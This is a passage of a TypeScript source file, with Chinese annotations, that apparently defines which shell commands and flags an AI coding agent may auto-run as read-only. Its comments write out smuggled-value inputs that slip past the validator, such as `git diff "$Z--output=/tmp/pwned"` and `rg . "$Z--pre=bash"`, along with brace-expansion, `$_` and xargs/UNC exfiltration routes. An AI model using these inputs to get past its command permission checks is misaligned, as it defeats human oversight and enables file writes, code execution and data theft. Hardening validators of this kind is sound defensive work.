      '--ip-address': 'none',
      '-I': 'none', // --all-ip-addresses
      '--all-ip-addresses': 'none',
      '-a': 'none', // --alias
      '--alias': 'none',
      '-d': 'none', // --domain
      '--domain': 'none',
      '-A': 'none', // --all-fqdns
      '--all-fqdns': 'none',
      '-v': 'none', // --verbose
      '--verbose': 'none',
      '-h': 'none', // --help
      '--help': 'none',
      '-V': 'none', // --version
      '--version': 'none',
    },
    // CRITICAL: Block any positional arguments - they set the hostname
    // Also block -F/--file, -b/--boot, -y/--yp/--nis (not in safeFlags = blocked)
    // Use regex to ensure no positional args after flags
    regex: /^hostname(?:\s+(?:-[a-zA-Z]|--[a-zA-Z-]+))*\s*$/,
  },
  // info command - moved from READONLY_COMMANDS because -o/--output writes to files
  // Also --dribble writes keystrokes to file, --init-file loads custom config
  // We only allow safe display/navigation options
  // info 的风险 flag：-o/--output 写文件、--init-file 加载自定义配置（可导致代码执行）
  info: {
    safeFlags: {
      // Navigation/display options (safe)
      '-f': 'string', // --file - specify manual file to read
      '--file': 'string',
      '-d': 'string', // --directory - search path
      '--directory': 'string',
      '-n': 'string', // --node - specify node
      '--node': 'string',
      '-a': 'none', // --all
      '--all': 'none',
      '-k': 'string', // --apropos - search
      '--apropos': 'string',
      '-w': 'none', // --where - show location
      '--where': 'none',
      '--location': 'none',
      '--show-options': 'none',
      '--vi-keys': 'none',
      '--subnodes': 'none',
      '-h': 'none',
      '--help': 'none',
      '--usage': 'none',
      '--version': 'none',
    },
    // Dangerous flags NOT included (blocked by omission):
    // -o / --output - writes output to file
    // --dribble - records keystrokes to file
    // --init-file - loads custom config (potential code execution)
    // --restore - replays keystrokes from file
  },

  // lsof 大部分 flag 安全，但 +m 会创建「挂载补充文件」（写磁盘），且 + 开头的参数会被当成位置参数，
  //   所以要用回调专门拦 +m
  lsof: {
    safeFlags: {
      '-?': 'none',
      '-h': 'none',
      '-v': 'none',
      '-a': 'none',
      '-b': 'none',
      '-C': 'none',
      '-l': 'none',
      '-n': 'none',
      '-N': 'none',
      '-O': 'none',
      '-P': 'none',
      '-Q': 'none',
      '-R': 'none',
      '-t': 'none',
      '-U': 'none',
      '-V': 'none',
      '-X': 'none',
      '-H': 'none',
      '-E': 'none',
      '-F': 'none',
      '-g': 'none',
      '-i': 'none',
      '-K': 'none',
      '-L': 'none',
      '-o': 'none',
      '-r': 'none',
      '-s': 'none',
      '-S': 'none',
      '-T': 'none',
      '-x': 'none',
      '-A': 'string',
      '-c': 'string',
      '-d': 'string',
      '-e': 'string',
      '-k': 'string',
      '-p': 'string',
      '-u': 'string',
      // OMITTED (writes to disk): -D (device cache file build/update)
    },
    // Block +m (create mount supplement file) — writes to disk.
    // +prefix flags are treated as positional args by validateFlags,
    // so we must catch them here. lsof accepts +m<path> (attached path, no space)
    // with both absolute (+m/tmp/evil) and relative (+mfoo, +m.evil) paths.
    additionalCommandIsDangerousCallback: (_rawCommand, args) =>
      args.some(a => a === '+m' || a.startsWith('+m')),
  },

  pgrep: {
    safeFlags: {
      '-d': 'string',
      '--delimiter': 'string',
      '-l': 'none',
      '--list-name': 'none',
      '-a': 'none',
      '--list-full': 'none',
      '-v': 'none',
      '--inverse': 'none',
      '-w': 'none',
      '--lightweight': 'none',
      '-c': 'none',
      '--count': 'none',
      '-f': 'none',
      '--full': 'none',
      '-g': 'string',
      '--pgroup': 'string',
      '-G': 'string',
      '--group': 'string',
      '-i': 'none',
      '--ignore-case': 'none',
      '-n': 'none',
      '--newest': 'none',
      '-o': 'none',
      '--oldest': 'none',
      '-O': 'string',
      '--older': 'string',
      '-P': 'string',
      '--parent': 'string',
      '-s': 'string',
      '--session': 'string',
      '-t': 'string',
      '--terminal': 'string',
      '-u': 'string',
      '--euid': 'string',
      '-U': 'string',
      '--uid': 'string',
      '-x': 'none',
      '--exact': 'none',
      '-F': 'string',
      '--pidfile': 'string',
      '-L': 'none',
      '--logpidfile': 'none',
      '-r': 'string',
      '--runstates': 'string',
      '--ns': 'string',
      '--nslist': 'string',
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
    },
  },

  // tput 的风险不在「写文件」，而在「改变终端状态 / 执行终端初始化程序」：
  //   init、reset 会执行 terminfo 里的 iprog（任意程序）；clear 会清掉回滚缓冲区（等于销毁证据）
  tput: {
    safeFlags: {
      '-T': 'string',
      '-V': 'none',
      '-x': 'none',
      // SECURITY: -S (read capability names from stdin) deliberately EXCLUDED.
      // It must NOT be in safeFlags because validateFlags unbundles combined
      // short flags (e.g., -xS → -x + -S), but the callback receives the raw
      // token '-xS' and only checks exact match 'token === "-S"'. Excluding -S
      // from safeFlags ensures validateFlags rejects it (bundled or not) before
      // the callback runs. The callback's -S check is defense-in-depth.
    },
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // Capabilities that modify terminal state or could be harmful.
      // init/reset run iprog (arbitrary code from terminfo) and modify tty settings.
      // rs1/rs2/rs3/is1/is2/is3 are the individual reset/init sequences that
      // init/reset invoke internally — rs1 sends ESC c (full terminal reset).
      // clear erases scrollback (evidence destruction). mc5/mc5p activate media copy
      // (redirect output to printer device). smcup/rmcup manipulate screen buffer.
      // pfkey/pfloc/pfx/pfxl program function keys — pfloc executes strings locally.
      // rf is reset file (analogous to if/init_file).
      // 危险「终端能力名」清单：这些能力会重置终端、执行程序、把输出重定向到打印机设备等
      const DANGEROUS_CAPABILITIES = new Set([
        'init',
        'reset',
        'rs1',
        'rs2',
        'rs3',
        'is1',
        'is2',
        'is3',
        'iprog',
        'if',
        'rf',
        'clear',
        'flash',
        'mc0',
        'mc4',
        'mc5',
        'mc5i',
        'mc5p',
        'pfkey',
        'pfloc',
        'pfx',
        'pfxl',
        'smcup',
        'rmcup',
      ])
      const flagsWithArgs = new Set(['-T'])
      let i = 0
      let afterDoubleDash = false
      while (i < args.length) {
        const token = args[i]!
        if (token === '--') {
          afterDoubleDash = true
          i++
        } else if (!afterDoubleDash && token.startsWith('-')) {
          // Defense-in-depth: block -S even if it somehow passes validateFlags
          if (token === '-S') return true
          // Also check for -S bundled with other flags (e.g., -xS)
          if (
            !token.startsWith('--') &&
            token.length > 2 &&
            token.includes('S')
          )
            return true
          if (flagsWithArgs.has(token)) {
            i += 2
          } else {
            i++
          }
        } else {
          if (DANGEROUS_CAPABILITIES.has(token)) return true
          i++
        }
      }
      return false
    },
  },

  // ss — socket statistics (iproute2). Read-only query tool equivalent to netstat.
  // SECURITY: -K/--kill (forcibly close sockets) and -D/--diag (dump raw data to file)
  // are deliberately excluded. -F/--filter (read filter from file) also excluded.
  // ss（socket 统计）的定位是 netstat 的替代品，只读查询；但 -K 会强关 socket、-D 会把数据 dump 成文件
  ss: {
    safeFlags: {
      '-h': 'none',
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
      '-n': 'none',
      '--numeric': 'none',
      '-r': 'none',
      '--resolve': 'none',
      '-a': 'none',
      '--all': 'none',
      '-l': 'none',
      '--listening': 'none',
      '-o': 'none',
      '--options': 'none',
      '-e': 'none',
      '--extended': 'none',
      '-m': 'none',
      '--memory': 'none',
      '-p': 'none',
      '--processes': 'none',
      '-i': 'none',
      '--info': 'none',
      '-s': 'none',
      '--summary': 'none',
      '-4': 'none',
      '--ipv4': 'none',
      '-6': 'none',
      '--ipv6': 'none',
      '-0': 'none',
      '--packet': 'none',
      '-t': 'none',
      '--tcp': 'none',
      '-M': 'none',
      '--mptcp': 'none',
      '-S': 'none',
      '--sctp': 'none',
      '-u': 'none',
      '--udp': 'none',
      '-d': 'none',
      '--dccp': 'none',
      '-w': 'none',
      '--raw': 'none',
      '-x': 'none',
      '--unix': 'none',
      '--tipc': 'none',
      '--vsock': 'none',
      '-f': 'string',
      '--family': 'string',
      '-A': 'string',
      '--query': 'string',
      '--socket': 'string',
      '-Z': 'none',
      '--context': 'none',
      '-z': 'none',
      '--contexts': 'none',
      // SECURITY: -N/--net EXCLUDED — performs setns(), unshare(), mount(), umount()
      // to switch network namespace. While isolated to forked process, too invasive.
      '-b': 'none',
      '--bpf': 'none',
      '-E': 'none',
      '--events': 'none',
      '-H': 'none',
      '--no-header': 'none',
      '-O': 'none',
      '--oneline': 'none',
      '--tipcinfo': 'none',
      '--tos': 'none',
      '--cgroup': 'none',
      '--inet-sockopt': 'none',
      // SECURITY: -K/--kill EXCLUDED — forcibly closes sockets
      // 中文补充：这三个被排除的 flag 分别对应「关闭连接」「写文件」「从文件读过滤规则」，都不是只读行为
      // SECURITY: -D/--diag EXCLUDED — dumps raw TCP data to a file
      // SECURITY: -F/--filter EXCLUDED — reads filter expressions from a file
    },
  },

  // fd/fdfind — fast file finder (fd-find). Read-only search tool.
  // SECURITY: -x/--exec (execute command per result) and -X/--exec-batch
  // (execute command with all results) are deliberately excluded.
  fd: { safeFlags: { ...FD_SAFE_FLAGS } },
  // fdfind is the Debian/Ubuntu package name for fd — same binary, same flags
  fdfind: { safeFlags: { ...FD_SAFE_FLAGS } },

  ...PYRIGHT_READ_ONLY_COMMANDS,
  ...DOCKER_READ_ONLY_COMMANDS,
}

// gh commands are ant-only since they make network requests, which goes against
// the read-only validation principle of no network access
// 内部专用表：gh 系列与 aki 都会发起**网络请求**，与「只读 = 不发网络请求」的原则冲突，
//   所以只在内部环境（USER_TYPE=ant）才把它们并进生效表
const ANT_ONLY_COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  // All gh read-only commands from shared validation map
  ...GH_READ_ONLY_COMMANDS,
  // aki — Anthropic internal knowledge-base search CLI.
  // Network read-only (same policy as gh). --audit-csv omitted: writes to disk.
  aki: {
    safeFlags: {
      '-h': 'none',
      '--help': 'none',
      '-k': 'none',
      '--keyword': 'none',
      '-s': 'none',
      '--semantic': 'none',
      '--no-adaptive': 'none',
      '-n': 'number',
      '--limit': 'number',
      '-o': 'number',
      '--offset': 'number',
      '--source': 'string',
      '--exclude-source': 'string',
      '-a': 'string',
      '--after': 'string',
      '-b': 'string',
      '--before': 'string',
      '--collection': 'string',
      '--drive': 'string',
      '--folder': 'string',
      '--descendants': 'none',
      '-m': 'string',
      '--meta': 'string',
      '-t': 'string',
      '--threshold': 'string',
      '--kw-weight': 'string',
      '--sem-weight': 'string',
      '-j': 'none',
      '--json': 'none',
      '-c': 'none',
      '--chunk': 'none',
      '--preview': 'none',
      '-d': 'none',
      '--full-doc': 'none',
      '-v': 'none',
      '--verbose': 'none',
      '--stats': 'none',
      '-S': 'number',
      '--summarize': 'number',
      '--explain': 'none',
      '--examine': 'string',
      '--url': 'string',
      '--multi-turn': 'number',
      '--multi-turn-model': 'string',
      '--multi-turn-context': 'string',
      '--no-rerank': 'none',
      '--audit': 'none',
      '--local': 'none',
      '--staging': 'none',
    },
  },
}

/**
 * 【做什么】按当前平台与环境组装出「实际生效」的白名单表
 * 【为什么需要】同一份代码跑在 Windows / macOS / Linux、内部 / 外部环境，可用命令是不一样的
 * 【返回】合并后的表
 * 【关键步骤】
 *   ① Windows 上把 xargs 剔除：Windows 下 `cat file | xargs cat` 会触发 UNC 路径的 SMB 解析，
 *      而 UNC 路径藏在**文件内容**里，正则根本扫不到，所以直接禁用（这是数据外泄通道）
 *   ② 内部环境才并入 ANT_ONLY_COMMAND_ALLOWLIST
 */
function getCommandAllowlist(): Record<string, CommandConfig> {
  let allowlist: Record<string, CommandConfig> = COMMAND_ALLOWLIST
  // On Windows, xargs can be used as a data-to-code bridge: if a file contains
  // a UNC path, `cat file | xargs cat` feeds that path to cat, triggering SMB
  // resolution. Since the UNC path is in file contents (not the command string),
  // regex-based detection cannot catch this.
  if (getPlatform() === 'windows') {
    // 解构丢弃字段的写法：`{ xargs: _, ...rest }` = 「把 xargs 拿出来扔掉，其余都收进 rest」
    const { xargs: _, ...rest } = allowlist
    allowlist = rest
  }
  if (process.env.USER_TYPE === 'ant') {
    return { ...allowlist, ...ANT_ONLY_COMMAND_ALLOWLIST }
  }
  return allowlist
}

/**
 * Commands that are safe to use as xargs targets for auto-approval.
 *
 * SECURITY: Only add a command to this list if it has NO flags that can:
 * 1. Write to files (e.g., find's -fprint, sed's -i)
 * 2. Execute code (e.g., find's -exec, awk's system(), perl's -e)
 * 3. Make network requests
 *
 * These commands must be purely read-only utilities. When xargs uses one of
 * these as a target, we stop validating flags after the target command
 * (see the `break` in isCommandSafeViaFlagParsing), so the command itself
 * must not have ANY dangerous flags, not just a safe subset.
 *
 * Each command was verified by checking its man page for dangerous capabilities.
 */
// xargs 的「目标命令」白名单。要求极其严格：这些命令必须**没有任何**危险 flag，
//   因为一旦把它们当目标，后面的 flag 就不再继续校验了（见 isCommandSafeViaFlagParsing 里的 break）
const SAFE_TARGET_COMMANDS_FOR_XARGS = [
  'echo', // Output only, no dangerous flags
  'printf', // xargs runs /usr/bin/printf (binary), not bash builtin — no -v support
  'wc', // Read-only counting, no dangerous flags
  'grep', // Read-only search, no dangerous flags
  'head', // Read-only, no dangerous flags
  'tail', // Read-only (including -f follow), no dangerous flags
]

/**
 * Unified command validation function that replaces individual validator functions.
 * Uses declarative configuration from COMMAND_ALLOWLIST to validate commands and their flags.
 * Handles combined flags, argument validation, and shell quoting bypass detection.
 */
/**
 * 【做什么】基于白名单表判定：命令 + 它带的 flag 是否都安全
 * 【为什么需要】这是比正则更可靠的判定方式——正则容易被「缩写 flag」「参数连写」绕过，
 *   而逐 flag 比对可以精确知道每个 flag 是否会吃掉后续参数
 * 【入参】command：单条命令字符串
 * 【返回】true = 安全（可放行）；任何一步拿不准都返回 false
 * 【关键步骤】
 *   ① shell 分词（含 glob 转字符串）；解析失败直接 false
 *   ② 含管道/重定向等操作符 → false（复合命令应在更上层就拆开，这里只管单条）
 *   ③ 在白名单表里匹配命令（支持 `git diff` 这种**多词**命令）
 *   ④ git ls-remote 特殊处理：拒绝带 URL 的参数（防止用远端地址做数据外带）
 *   ⑤ 拒绝任何含 $ 的 token、以及同时含 { 和 , 的 token（brace 展开混淆）
 *   ⑥ 交给 validateFlags 做 flag 校验
 *   ⑦ 再依次过：自定义正则、反引号检查、grep/rg 的换行检查、自定义回调
 */
export function isCommandSafeViaFlagParsing(command: string): boolean {
  // Parse the command to get individual tokens using shell-quote for accuracy
  // Handle glob operators by converting them to strings, they don't matter from the perspective
  // of this function
  const parseResult = tryParseShellCommand(command, env => `$${env}`)
  if (!parseResult.success) return false

  const parsed = parseResult.tokens.map(token => {
    if (typeof token !== 'string') {
      token = token as { op: 'glob'; pattern: string }
      if (token.op === 'glob') {
        return token.pattern
      }
    }
    return token
  })

  // If there are operators (pipes, redirects, etc.), it's not a simple command.
  // Breaking commands down into their constituent parts is handled upstream of
  // this function, so we reject anything with operators here.
  const hasOperators = parsed.some(token => typeof token !== 'string')
  if (hasOperators) {
    return false
  }

  // Now we know all tokens are strings
  const tokens = parsed as string[]

  if (tokens.length === 0) {
    return false
  }

  // Find matching command configuration
  let commandConfig: CommandConfig | undefined
  let commandTokens: number = 0

  // Check for multi-word commands first (e.g., "git diff", "git stash list")
  const allowlist = getCommandAllowlist()
  for (const [cmdPattern] of Object.entries(allowlist)) {
    const cmdTokens = cmdPattern.split(' ')
    if (tokens.length >= cmdTokens.length) {
      let matches = true
      for (let i = 0; i < cmdTokens.length; i++) {
        if (tokens[i] !== cmdTokens[i]) {
          matches = false
          break
        }
      }
      if (matches) {
        commandConfig = allowlist[cmdPattern]
        commandTokens = cmdTokens.length
        break
      }
    }
  }

  if (!commandConfig) {
    return false // Command not in allowlist
  }

  // Special handling for git ls-remote to reject URLs that could lead to data exfiltration
  // 中文补充：git ls-remote 后面如果跟的是 URL 或远端名，就可能把信息发到外部；
  //   所以凡是带 :// 、@ 、: 、$ 的参数一律拒绝
  if (tokens[0] === 'git' && tokens[1] === 'ls-remote') {
    // Check if any argument looks like a URL or remote specification
    for (let i = 2; i < tokens.length; i++) {
      const token = tokens[i]
      if (token && !token.startsWith('-')) {
        // Reject HTTP/HTTPS URLs
        if (token.includes('://')) {
          return false
        }
        // Reject SSH URLs like git@github.com:user/repo.git
        if (token.includes('@') || token.includes(':')) {
          return false
        }
        // Reject variable references
        if (token.includes('$')) {
          return false
        }
      }
    }
  }

  // SECURITY: Reject ANY token containing `$` (variable expansion). The
  // 中文详解（本文件最重要的安全点之一）：
  //   分词器把 $VAR 当成**普通文本**保留，但 bash 运行时会把它展开（未定义则展开成空串）。
  //   这个「解析器差异」能同时骗过 flag 校验和自定义回调，例如：
  //     `git diff "$Z--output=/tmp/pwned"` → 校验器看到的是 `$Z--output=...`（不以 - 开头，当普通参数放过）；
  //     bash 实际执行的是 `git diff --output=/tmp/pwned` → 任意文件写入。
  //     `rg . "$Z--pre=bash" FILE` → 实际执行 `bash FILE` → 任意代码执行。
  //   结论：只要 token 里有 $，就无法确定它运行时的真实形态，一律拒绝
  // `env => \`$${env}\`` callback at line 825 preserves `$VAR` as LITERAL TEXT
  // in tokens, but bash expands it at runtime (unset vars → empty string).
  // This parser differential defeats BOTH validateFlags and callbacks:
  //
  //   (1) `$VAR`-prefix defeats validateFlags `startsWith('-')` check:
  //       `git diff "$Z--output=/tmp/pwned"` → token `$Z--output=/tmp/pwned`
  //       (starts with `$`) falls through as positional at ~:1730. Bash runs
  //       `git diff --output=/tmp/pwned`. ARBITRARY FILE WRITE, zero perms.
  //
  //   (2) `$VAR`-prefix → RCE via `rg --pre`:
  //       `rg . "$Z--pre=bash" FILE` → executes `bash FILE`. rg's config has
  //       no regex and no callback. SINGLE-STEP ARBITRARY CODE EXECUTION.
  //
  //   (3) `$VAR`-infix defeats additionalCommandIsDangerousCallback regex:
  //       `ps ax"$Z"e` → token `ax$Ze`. The ps callback regex
  //       `/^[a-zA-Z]*e[a-zA-Z]*$/` fails on `$` → "not dangerous". Bash runs
  //       `ps axe` → env vars for all processes. A fix limited to `$`-PREFIXED
  //       tokens would NOT close this.
  //
  // We check ALL tokens after the command prefix. Any `$` means we cannot
  // determine the runtime token value, so we cannot verify read-only safety.
  // This check must run BEFORE validateFlags and BEFORE callbacks.
  for (let i = commandTokens; i < tokens.length; i++) {
    const token = tokens[i]
    if (!token) continue
    // Reject any token containing $ (variable expansion)
    if (token.includes('$')) {
      return false
    }
    // Reject tokens with BOTH `{` and `,` (brace expansion obfuscation).
    // `git diff {@'{'0},--output=/tmp/pwned}` → shell-quote strips quotes
    // → token `{@{0},--output=/tmp/pwned}` has `{` + `,` → brace expansion.
    // This is defense-in-depth with validateBraceExpansion in bashSecurity.ts.
    // We require BOTH `{` and `,` to avoid false positives on legitimate
    // patterns: `stash@{0}` (git ref, has `{` no `,`), `{{.State}}` (Go
    // template, no `,`), `prefix-{}-suffix` (xargs, no `,`). Sequence form
    // `{1..5}` also needs checking (has `{` + `..`).
    // 花括号展开（brace expansion）也能造出「校验器看不到、bash 会展开」的 token，同样拒绝。
    //   要求同时出现 { 和 ,（或 ..），是为了不误伤 `stash@{0}` 这种正常的 git 引用写法
    if (token.includes('{') && (token.includes(',') || token.includes('..'))) {
      return false
    }
  }

  // Validate flags starting after the command tokens
  if (
    !validateFlags(tokens, commandTokens, commandConfig, {
      commandName: tokens[0],
      rawCommand: command,
      xargsTargetCommands:
        tokens[0] === 'xargs' ? SAFE_TARGET_COMMANDS_FOR_XARGS : undefined,
    })
  ) {
    return false
  }

  if (commandConfig.regex && !commandConfig.regex.test(command)) {
    return false
  }
  if (!commandConfig.regex && /`/.test(command)) {
    return false
  }
  // Block newlines and carriage returns in grep/rg patterns as they can be used for injection
  if (
    !commandConfig.regex &&
    (tokens[0] === 'rg' || tokens[0] === 'grep') &&
    /[\n\r]/.test(command)
  ) {
    return false
  }
  if (
    commandConfig.additionalCommandIsDangerousCallback &&
    commandConfig.additionalCommandIsDangerousCallback(
      command,
      tokens.slice(commandTokens),
    )
  ) {
    return false
  }

  return true
}

/**
 * Creates a regex pattern that matches safe invocations of a command.
 *
 * The regex ensures commands are invoked safely by blocking:
 * - Shell metacharacters that could lead to command injection or redirection
 * - Command substitution via backticks or $()
 * - Variable expansion that could contain malicious payloads
 * - Environment variable assignment bypasses (command=value)
 *
 * @param command The command name (e.g., 'date', 'npm list', 'ip addr')
 * @returns RegExp that matches safe invocations of the command
 */
// 生成「安全调用」正则：命令名 + 空白，其后不得出现 < > ( ) $ ` | { } & ; 换行 这些危险字符。
//   也就是说：这类命令只要不夹带 shell 元字符，就认为是安全的
function makeRegexForSafeCommand(command: string): RegExp {
  // Create regex pattern: /^command(?:\s|$)[^<>()$`|{}&;\n\r]*$/
  return new RegExp(`^${command}(?:\\s|$)[^<>()$\`|{}&;\\n\\r]*$`)
}

// Simple commands that are safe for execution (converted to regex patterns using makeRegexForSafeCommand)
// WARNING: If you are adding new commands here, be very careful to ensure
// they are truly safe. This includes ensuring:
// 1. That they don't have any flags that allow file writing or command execution
// 2. Use makeRegexForSafeCommand() to ensure proper regex pattern creation
// 简单只读命令清单：这些命令**本身**没有任何会写文件或执行代码的 flag，
//   所以只需用 makeRegexForSafeCommand 生成的通用正则兜住即可
const READONLY_COMMANDS = [
  // Cross-platform commands from shared validation
  ...EXTERNAL_READONLY_COMMANDS,

  // Unix/bash-specific read-only commands (not shared because they don't exist in PowerShell)

  // Time and date
  'cal',
  'uptime',

  // File content viewing (relative paths handled separately)
  'cat',
  'head',
  'tail',
  'wc',
  'stat',
  'strings',
  'hexdump',
  'od',
  'nl',

  // System info
  'id',
  'uname',
  'free',
  'df',
  'du',
  'locale',
  'groups',
  'nproc',

  // Path information
  'basename',
  'dirname',
  'realpath',

  // Text processing
  'cut',
  'paste',
  'tr',
  'column',
  'tac', // Reverse cat — displays file contents in reverse line order
  'rev', // Reverse characters in each line
  'fold', // Wrap lines to specified width
  'expand', // Convert tabs to spaces
  'unexpand', // Convert spaces to tabs
  'fmt', // Simple text formatter — output to stdout only
  'comm', // Compare sorted files line by line
  'cmp', // Byte-by-byte file comparison
  'numfmt', // Number format conversion

  // Path information (additional)
  'readlink', // Resolve symlinks — displays target of symbolic link

  // File comparison
  'diff',

  // true and false, used to silence or create errors
  'true',
  'false',

  // Misc. safe commands
  'sleep',
  'which',
  'type',
  'expr', // Evaluate expressions (arithmetic, string matching)
  'test', // Conditional evaluation (file checks, comparisons)
  'getconf', // Get system configuration values
  'seq', // Generate number sequences
  'tsort', // Topological sort
  'pr', // Paginate files for printing
]

// Complex commands that require custom regex patterns
// Warning: If possible, avoid adding new regexes here and prefer using COMMAND_ALLOWLIST
// instead. This allowlist-based approach to CLI flags is more secure and avoids
// vulns coming from gnu getopt_long.
// 需要定制正则的命令（echo / jq / cd / ls / find / uniq / ip / ifconfig 等）。
//   维护倾向：能进 COMMAND_ALLOWLIST 的尽量进表，正则只是兜底——正则挡不住 GNU getopt 的缩写等花招
const READONLY_COMMAND_REGEXES = new Set([
  // Convert simple commands to regex patterns using makeRegexForSafeCommand
  ...READONLY_COMMANDS.map(makeRegexForSafeCommand),

  // Echo that doesn't execute commands or use variables
  // Allow newlines in single quotes (safe) but not in double quotes (could be dangerous with variable expansion)
  // Also allow optional 2>&1 stderr redirection at the end
  /^echo(?:\s+(?:'[^']*'|"[^"$<>\n\r]*"|[^|;&`$(){}><#\\!"'\s]+))*(?:\s+2>&1)?\s*$/,

  // Claude CLI help
  /^claude -h$/,
  /^claude --help$/,

  // Git readonly commands are now handled via COMMAND_ALLOWLIST with explicit flag validation
  // (git status, git blame, git ls-files, git config --get, git remote, git tag, git branch)

  /^uniq(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?|-[fsw]\s+\d+))*(?:\s|$)\s*$/, // Only allow flags, no input/output files

  // System info
  /^pwd$/,
  /^whoami$/,
  // env and printenv removed - could expose sensitive environment variables

  // Development tools version checking - exact match only, no suffix allowed.
  // SECURITY: `node -v --run <task>` would execute package.json scripts because
  // Node processes --run before -v. Python/python3 --version are also anchored
  // for defense-in-depth. These were previously in EXTERNAL_READONLY_COMMANDS which
  // flows through makeRegexForSafeCommand and permits arbitrary suffixes.
  /^node -v$/,
  /^node --version$/,
  /^python --version$/,
  /^python3 --version$/,

  // Misc. safe commands
  // tree command moved to COMMAND_ALLOWLIST for proper flag validation (blocks -o/--output)
  /^history(?:\s+\d+)?\s*$/, // Only allow bare history or history with numeric argument - prevents file writing
  /^alias$/,
  /^arch(?:\s+(?:--help|-h))?\s*$/, // Only allow arch with help flags or no arguments

  // Network commands - only allow exact commands with no arguments to prevent network manipulation
  /^ip addr$/, // Only allow "ip addr" with no additional arguments
  /^ifconfig(?:\s+[a-zA-Z][a-zA-Z0-9_-]*)?\s*$/, // Allow ifconfig with interface name only (must start with letter)

  // JSON processing with jq - allow with inline filters and file arguments
  // File arguments are validated separately by pathValidation.ts
  // Allow pipes and complex expressions within quotes but prevent dangerous flags
  // Block command substitution - backticks are dangerous even in single quotes for jq
  // Block -f/--from-file, --rawfile, --slurpfile (read files into jq), --run-tests, -L/--library-path (load executable modules)
  // Block 'env' builtin and '$ENV' object which can access environment variables (defense in depth)
  /^jq(?!\s+.*(?:-f\b|--from-file|--rawfile|--slurpfile|--run-tests|-L\b|--library-path|\benv\b|\$ENV\b))(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?))*(?:\s+'[^'`]*'|\s+"[^"`]*"|\s+[^-\s'"][^\s]*)+\s*$/,

  // Path commands (path validation ensures they're allowed)
  // cd command - allows changing to directories
  /^cd(?:\s+(?:'[^']*'|"[^"]*"|[^\s;|&`$(){}><#\\]+))?$/,
  // ls command - allows listing directories
  /^ls(?:\s+[^<>()$`|{}&;\n\r]*)?$/,
  // find command - blocks dangerous flags
  // Allow escaped parentheses \( and \) for grouping, but block unescaped ones
  // NOTE: \\[()] must come BEFORE the character class to ensure \( is matched as an escaped paren,
  // not as backslash + paren (which would fail since paren is excluded from the character class)
  /^find(?:\s+(?:\\[()]|(?!-delete\b|-exec\b|-execdir\b|-ok\b|-okdir\b|-fprint0?\b|-fls\b|-fprintf\b)[^<>()$`|{}&;\n\r\s]|\s)+)?$/,
])

/**
 * Checks if a command contains glob characters (?, *, [, ]) or expandable `$`
 * variables OUTSIDE the quote contexts where bash would treat them as literal.
 * These could expand to bypass our regex-based security checks.
 *
 * Glob examples:
 * - `python *` could expand to `python --help` if a file named `--help` exists
 * - `find ./ -?xec` could expand to `find ./ -exec` if such a file exists
 * Globs are literal inside BOTH single and double quotes.
 *
 * Variable expansion examples:
 * - `uniq --skip-chars=0$_` → `$_` expands to last arg of previous command;
 *   with IFS word splitting, this smuggles positional args past "flags-only"
 *   regexes. `echo " /etc/passwd /tmp/x"; uniq --skip-chars=0$_` → FILE WRITE.
 * - `cd "$HOME"` → double-quoted `$HOME` expands at runtime.
 * Variables are literal ONLY inside single quotes; they expand inside double
 * quotes and unquoted.
 *
 * The `$` check guards the READONLY_COMMAND_REGEXES fallback path. The `$`
 * token check in isCommandSafeViaFlagParsing only covers COMMAND_ALLOWLIST
 * commands; hand-written regexes like uniq's `\S+` and cd's `"[^"]*"` allow `$`.
 * Matches `$` followed by `[A-Za-z_@*#?!$0-9-]` covering `$VAR`, `$_`, `$@`,
 * `$*`, `$#`, `$?`, `$!`, `$$`, `$-`, `$0`-`$9`. Does NOT match `${` or `$(` —
 * those are caught by COMMAND_SUBSTITUTION_PATTERNS in bashSecurity.ts.
 *
 * @param command The command string to check
 * @returns true if the command contains unquoted glob or expandable `$`
 */
/**
 * 【做什么】逐字符扫描，找出「不在引号内」的通配符（? * [ ]）与可展开的 $ 变量
 * 【为什么需要】这类字符在**运行时**才展开，静态分析无法知道展开结果：
 *   - `python *`：若目录下正好有名为 --help 的文件，就会变成 `python --help`，绕过正则
 *   - `uniq --skip-chars=0$_`：`$_` 运行时展开成上条命令的最后参数，可把位置参数偷渡进来
 * 【返回】true = 存在未加引号的展开（应拒绝放行）
 * 【关键步骤】
 *   ① 维护三个状态：是否在单引号内、是否在双引号内、上一个字符是不是转义符
 *   ② **只有在单引号之外**才把反斜杠当转义符（bash 里单引号内的 \ 是字面量）
 *   ③ 单引号内全部字面量，直接跳过
 *   ④ 检查 $ 后是否紧跟变量名/特殊参数字符（双引号内 $ 也会展开，所以要查）
 *   ⑤ 通配符只在完全无引号时才算数（单双引号内都是字面量）
 */
function containsUnquotedExpansion(command: string): boolean {
  // Track quote state to avoid false positives for patterns inside quoted strings
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false

  for (let i = 0; i < command.length; i++) {
    const currentChar = command[i]

    // Handle escape sequences
    if (escaped) {
      escaped = false
      continue
    }

    // SECURITY: Only treat backslash as escape OUTSIDE single quotes. In bash,
    // 中文详解（一个典型的「状态机被带偏」的坑）：
    //   bash 里单引号内的反斜杠是**字面量**，不转义下一个字符。若不区分，遇到 `ls '\' *` 时：
    //   反斜杠把转义标志置为 true → 本该结束单引号的那个引号被当成「被转义的字符」吃掉 →
    //   状态机从此一直以为自己还在单引号里 → 后面真正的通配符 * 被判为「在引号内、字面量」→ 漏检
    // `\` inside `'...'` is LITERAL — it does not escape the next character.
    // Without this guard, `'\'` desyncs the quote tracker: the `\` sets
    // escaped=true, then the closing `'` is consumed by the escaped-skip
    // instead of toggling inSingleQuote. Parser stays in single-quote
    // mode for the rest of the command, missing ALL subsequent expansions.
    // Example: `ls '\' *` — bash sees glob `*`, but desynced parser thinks
    // `*` is inside quotes → returns false (glob NOT detected).
    // Defense-in-depth: hasShellQuoteSingleQuoteBug catches `'\'` patterns
    // before this function is reached, but we fix the tracker anyway for
    // consistency with the correct implementations in bashSecurity.ts.
    if (currentChar === '\\' && !inSingleQuote) {
      escaped = true
      continue
    }

    // Update quote state
    if (currentChar === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      continue
    }

    if (currentChar === '"' && !inSingleQuote) {
